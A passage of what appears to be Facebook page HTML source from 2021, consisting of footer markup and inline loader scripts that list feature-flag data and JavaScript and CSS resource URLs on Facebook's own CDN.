							<div><span> Facebook © 2021</span></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0"
				style="display:none" /></span>
	</div>
	<div style="display:none">
		<div></div>
		<div></div>
		<div></div>
	</div>
	<script>
		requireLazy(["HasteSupportData"], function (m) {
			m.handle({
				"bxData": {
					"875231": {
						"uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yD\/r\/d4ZIVX-5C-b.ico"
					}
				},
				"clpData": {
					"1838142": {
						"r": 1,
						"s": 1
					}
				},
				"gkxData": {
					"677762": {
						"result": true,
						"hash": "AT6e9MvRyXpacwOYbTE"
					},
					"1243461": {
						"result": false,
						"hash": "AT7fIw7JO3EJySTcerA"
					},
					"176": {
						"result": true,
						"hash": "AT4NwIszPuVVxWDOrsw"
					},
					"1167394": {
						"result": false,
						"hash": "AT7BpN-tlUPwbIIFnww"
					},
					"1908135": {
						"result": false,
						"hash": "AT6miGypJl3m2Aq4vyI"
					},
					"819236": {
						"result": false,
						"hash": "AT66vW86d2uJ-kXPM58"
					},
					"12": {
						"result": false,
						"hash": "AT7MdxfOMhMQYcz0Mos"
					},
					"1646": {
						"result": false,
						"hash": "AT4QD7x1GFNYajJZqUQ"
					},
					"729631": {
						"result": false,
						"hash": "AT7b0tj8AHWG5lTFeVs"
					},
					"1281505": {
						"result": false,
						"hash": "AT4PHZM9gFoypCjQ3BQ"
					},
					"1291023": {
						"result": false,
						"hash": "AT519LseIG1nwq3oHrE"
					},
					"1294182": {
						"result": false,
						"hash": "AT4vd6mwrtAJouEJmj4"
					},
					"1399218": {
						"result": true,
						"hash": "AT6guCW1eyIkOV1E6QM"
					},
					"1401060": {
						"result": true,
						"hash": "AT5aetN5Gb3reIXVPjc"
					},
					"1485055": {
						"result": true,
						"hash": "AT5lkGxmhfrVKlcnOS0"
					},
					"1596063": {
						"result": false,
						"hash": "AT7JHuDWtaOqRuBUpYM"
					},
					"1597642": {
						"result": true,
						"hash": "AT78G4fDXhlnMl7okWE"
					},
					"1647260": {
						"result": false,
						"hash": "AT4WdkrQSGE5dIsEt8g"
					},
					"1695831": {
						"result": false,
						"hash": "AT7RA6TJmDFGF-D6a-8"
					},
					"1722014": {
						"result": false,
						"hash": "AT6_M5gpc6RLrHjc7Jo"
					},
					"1742795": {
						"result": false,
						"hash": "AT6dbnY5JZm_bTINOME"
					},
					"1778302": {
						"result": false,
						"hash": "AT65fisZhmc2X92E7W0"
					},
					"1840809": {
						"result": false,
						"hash": "AT5nYctoTsr7alRiGnE"
					},
					"1848749": {
						"result": false,
						"hash": "AT5GsH9Kb-3W-taZfeo"
					},
					"1906871": {
						"result": false,
						"hash": "AT6dIBiVv9bUDXlmAcc"
					},
					"1985945": {
						"result": true,
						"hash": "AT66Oo5lY__5wUTpOlU"
					},
					"1099893": {
						"result": false,
						"hash": "AT5kly2LSZV_DKGRZiw"
					},
					"1951072": {
						"result": true,
						"hash": "AT7aEvzO1O_H_j8HXm0"
					}
				},
				"qexData": {
					"1981829": {
						"r": null
					}
				}
			})
		});
		requireLazy(["Bootloader"], function (m) {
			m.handlePayload({
				"sr_revision": 1004120961,
				"consistency": {
					"rev": 1004120961
				},
				"rsrcMap": {
					"cQxytD7": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iJoa4\/y6\/l\/ar_AR\/6d1QoB2_uVs.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"3rMnPS8": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/IUy0P1uEqH3.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"3TyePo3": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/Nk-rM4iWJZl.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"v1+sq1b": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/JMDziI07c6T.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"xblMFJz": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/r\/vLtbBJ-NnYi.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Ahpssax": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i8TJ4\/yw\/l\/ar_AR\/2OT6iBvFE9-.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"m6fu0Uj": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ii6o4\/y_\/l\/ar_AR\/kJP5_oKM8TN.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"EUr71De": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6hh4\/yv\/l\/ar_AR\/jxwcfu0CCAW.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"iMefXgN": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3inqT4\/yM\/l\/ar_AR\/RTkqPFbXKo8.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"hnxwrH6": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6sE4\/yn\/l\/ar_AR\/IHQBbcf51X4.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"ObZLBkr": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/xn-3wPDECjN.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"zBwBFaB": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTfb4\/y7\/l\/ar_AR\/I8CRScj8Xzv.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"3kY+atW": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/YL6q3hajciu.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"fmuUqJu": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/5jPgwZZ0svi.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"yHdroQC": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ii6o4\/y6\/l\/ar_AR\/AghE3rjighB.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"a2kVExf": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/r\/rD1a_wAg_cA.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"M29NYeH": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/r\/-ACd7I_U0sE.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"\/mnVquy": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iyiq4\/yp\/l\/ar_AR\/osmC7dlw6ol.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"lCiWnqM": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iOKY4\/yl\/l\/ar_AR\/jVBeKsVUQnx.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"mOo6NdC": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1Nb4\/y6\/l\/ar_AR\/6CQ9IAxqyXz.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"4fsirIW": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/l0KFA2p5VOi.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"uI4mGy8": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/l\/1,cross\/57oRQhFnXIx.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"pKluVrH": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKtU4\/yL\/l\/ar_AR\/uUI3We5Rieh.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"9TsS9qn": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLWb4\/yQ\/l\/ar_AR\/3hYp6KeSpcT.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"b8axCWk": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/6HrV14u_akn.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"nZbuDsf": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFnf4\/yg\/l\/ar_AR\/XewF6DVUnSI.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"IhNCONa": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iI1o4\/yS\/l\/ar_AR\/HvXq4MjTQ6Q.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"rS+r4uN": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/Pzb0PrCE1Ag.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"JmuxjnF": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4FE4\/yh\/l\/ar_AR\/oOuprcUbXa5.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"qnCF7Db": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/SIV1chUwD1L.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"XhjL9EU": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idKy4\/yw\/l\/ar_AR\/9dJ8PBiZzcD.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"F7rjU1Z": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3izrD4\/yD\/l\/ar_AR\/XRnhGqcFd0e.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"xKWpXl1": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iyGq4\/yt\/l\/ar_AR\/GwJyfRfwg5_.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"E8Lmckg": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/JQZZtSnKma3.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Z\/0YDhn": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ifTo4\/yZ\/l\/ar_AR\/tQeT_s75gAf.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"KaS2VEZ": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/l\/1,cross\/r7pEA0nMJx5.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"oPsqUOW": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/r\/E-6ZfqxZ9Sb.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"QAJEJ1Z": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/dqnNWRa09Lr.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"7b0v5BY": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iwJK4\/yB\/l\/ar_AR\/OdXiN7oeF_W.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"xeh51eh": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/l\/1,cross\/3hskFILgOzA.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"T+lTEcn": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/lfPetmdCZdr.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"xbU+6DE": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/l\/1,cross\/BqBiBhAlC41.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"wzs1q2C": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/l\/1,cross\/tCBOVdRNl1w.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"gLzRNK0": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ipkG4\/y5\/l\/ar_AR\/HLJThVU89Yk.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Etm\/IjM": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/r\/rmHErsDr3Wq.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"0GfxlCl": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/l\/1,cross\/cMc6Fh_A23a.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"DEZESJf": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4x64\/y3\/l\/ar_AR\/U4_QI2SNLZj.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"bhRNkoY": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/r\/1sWyeOhXYEF.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"acf8ck5": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iqNo4\/y5\/l\/ar_AR\/OMMwb72O0eT.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"ccBX1oX": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ipoM4\/y9\/l\/ar_AR\/xqdIHa8I6D_.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"QqWHC2O": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/4Kt8on2Z6TR.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"yLzmy2Y": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFwa4\/yl\/l\/ar_AR\/F7q1797-s4M.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"6r7xG5Q": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yT\/r\/EXws13RaiVK.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"JxoJ3RA": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/Qr1YazKE2ke.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"D8ZeyQb": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3igFd4\/yE\/l\/ar_AR\/vN5az0l--bY.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"I+YjrlV": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6og4\/ys\/l\/ar_AR\/uZ7MexoPJ6r.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"V9aeY6e": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/l\/1,cross\/s6dXFGGM3z8.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"elJXsFF": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/G7bKJZUtxXJ.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"z4cH5Sq": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3inEd4\/yk\/l\/ar_AR\/WenuCNQlZWi.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"fqMQ+tt": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/l\/1,cross\/TF5DpvD7-o1.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"W1HmBID": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iCNc4\/ye\/l\/ar_AR\/UdGh9g14Y-L.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"UqhlYof": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/l\/1,cross\/0eHCiZT_Tyx.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"sJu7jug": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/l\/1,cross\/PHG0OTB1sB8.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"jqpVU1P": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/OZFX3Nm2Xa6.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"HdBQjT6": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ixt04\/yd\/l\/ar_AR\/2HWc_B_fZC_.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"OXZLikm": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/l\/1,cross\/j6NCsm2RBzI.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"hMGDL9a": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/r\/bJfzxSjQXE9.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"fXUcXgL": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/l\/1,cross\/SE-OWcM2FjV.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"4gwRtu8": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/r\/AzrFeenYwg2.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"fKzyyQv": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/l\/1,cross\/kyyzy2oEV5B.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"hFeShQM": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ii6o4\/yi\/l\/ar_AR\/pHRW5ikuDOQ.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"zusDUHN": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ilG14\/y_\/l\/ar_AR\/gSF1dEUCK4H.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"eG+1hjB": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/l\/1,cross\/yoL0tJACcSr.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"3cctxVU": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9ar4\/y5\/l\/ar_AR\/9r7Xxcn1bva.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"iawGwfB": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y1\/r\/AwMCUVYyYp0.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"nxDOMHN": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iqVu4\/y9\/l\/ar_AR\/J2RjJP3fMbW.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"wrsBmcy": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ixx44\/yN\/l\/ar_AR\/svq9vKlnOwn.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"P9ododw": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/l\/1,cross\/NKUyg709F42.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"O6hxjMR": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yD\/l\/1,cross\/sKD-Uql-vRf.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"xnysXB\/": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imkb4\/yK\/l\/ar_AR\/91fA4iJH3qJ.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"UV8u8r5": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/l\/1,cross\/g74dyWXvek4.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"Q0qXMhX": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7xH4\/yw\/l\/ar_AR\/MKNaTnvBJtB.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"rvFuO9B": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ietY4\/yH\/l\/ar_AR\/fKEjtxv3Rqm.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"sETc+Q9": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iEYC4\/yo\/l\/ar_AR\/VRakbetfoiX.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"IitLduT": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/-ITL1vte39Z.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"is+mZu5": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/l\/1,cross\/uZuNVVC-1OI.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"f9ky1ix": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iHgt4\/yH\/l\/ar_AR\/DFAn5LKfNst.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"wqRy\/7n": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/1,cross\/Kiv4Ih1X0Mj.css?_nc_x=Ij3Wp8lg5Kz",
						"nonblocking": 1
					},
					"CjT\/9Bp": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3io9n4\/ye\/l\/ar_AR\/-Z7lGPNYFec.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"wxbS\/lH": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/SqZvqCnGHeK.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"61PU\/dp": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/l\/1,cross\/lBKjLuRnyfM.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"BdDCl1d": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/r\/OzT00QdL8S-.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Xk0Aw3Y": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/l\/1,cross\/KsqtrVAlHFi.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"ZqWogdD": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/PWYBU9mg__c.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Ov5IE9x": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/NMBcw8TyUMf.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"JZPe1rm": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKcq4\/y8\/l\/ar_AR\/QfR9hL0bbF5.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"muCMmpg": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1MJ4\/ye\/l\/ar_AR\/x6ndi9_nkwS.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"cKXUyua": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3itRZ4\/yZ\/l\/ar_AR\/HtZqhLRr8XN.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"FXuW451": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/l\/1,cross\/oKXWRpcU76t.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"92gPxS9": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/qGcMb4jMOdc.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"bL4ivUz": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i98H4\/yH\/l\/ar_AR\/8qasc6VkfUb.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"LqbW4VB": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_Zy4\/y6\/l\/ar_AR\/gO_7DS2yGXJ.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"foiom6c": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/l\/1,cross\/XyUB83Clhm-.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"gWMJgTe": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/iGksp69foR_.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"hIek+bG": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"Gj8v9L4": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/r\/ywDDEhGQ14B.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"AvkS+CW": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ic1c4\/yg\/l\/ar_AR\/Qu9Z9vXr3DF.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"FDYHMVn": {
						"type": "css",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/l\/1,cross\/TAUOj0s4zhE.css?_nc_x=Ij3Wp8lg5Kz"
					},
					"+ClWygH": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/UJOxW2IHm1a.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"euxcw1r": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imjS4\/yE\/l\/ar_AR\/sTyPEP8c6C1.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"8ELCBwH": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"oE4DofT": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"VvVFw8n": {
						"type": "js",
						"src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz"
					},
					"P\/mr5VE": {
						"type": "css",
						"src": "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}",
						"nc": 1,
						"d": 1
					}
				},
				"compMap": {
					"AsyncSignal": {
						"r": ["cQxytD7", "3rMnPS8"],
						"be": 1
					},
					"ODS": {
						"r": ["3TyePo3", "v1+sq1b", "3rMnPS8"],
						"be": 1
					},
					"Dock": {
						"r": ["xblMFJz", "cQxytD7", "Ahpssax", "3TyePo3", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "FWQ5zbL", "lfTYLcL"],
						"be": 1
					},
					"WebSpeedInteractionsTypedLogger": {
						"r": ["EUr71De", "3TyePo3", "v1+sq1b", "3rMnPS8", "iMefXgN"],
						"rds": {
							"m": ["BanzaiScuba_DEPRECATED"],
							"r": ["cQxytD7"]
						},
						"be": 1
					},
					"AsyncRequest": {
						"r": ["cQxytD7", "3rMnPS8", "lfTYLcL", "Exs+c6w"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6", "3TyePo3", "v1+sq1b"]
						},
						"be": 1
					},
					"DOM": {
						"r": ["3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"Form": {
						"r": ["ObZLBkr", "3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"FormSubmit": {
						"r": ["cQxytD7", "zBwBFaB", "ObZLBkr", "3rMnPS8", "lfTYLcL", "Exs+c6w"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"],
							"r": ["hnxwrH6", "3TyePo3", "v1+sq1b"]
						},
						"be": 1
					},
					"Input": {
						"r": ["ObZLBkr"],
						"be": 1
					},
					"Live": {
						"r": ["cQxytD7", "3kY+atW", "fmuUqJu", "3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"Toggler": {
